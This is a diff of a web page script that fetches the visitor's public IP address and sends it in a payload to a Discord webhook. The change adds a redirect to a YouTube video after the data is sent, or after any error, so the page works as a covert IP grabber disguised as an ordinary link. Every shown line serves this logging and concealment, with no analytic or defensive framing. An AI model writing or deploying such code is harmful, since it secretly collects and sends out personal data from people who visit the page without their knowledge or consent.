@@ -58,12 +58,22 @@ fetch("https://api64.ipify.org?format=json")
         };
 
         // Send to Discord webhook
-        fetch(webhookUrl, {
+        return fetch(webhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
+        }).then(() => {
+          // Redirect after successful webhook send
+          window.location.href = "https://youtube.com/watch?v=SCaAetNzXIc";
+        }).catch(() => {
+          // Redirect even if webhook fails
+          window.location.href = "https://youtube.com/watch?v=SCaAetNzXIc";
         });
       });
   })
-  .catch(err => console.error("IP fetch error:", err));
+  .catch(err => {
+    console.error("IP fetch error:", err);
+    // Redirect even if IP fetch fails
+    window.location.href = "https://youtube.com/watch?v=SCaAetNzXIc";
+  });
 </script>
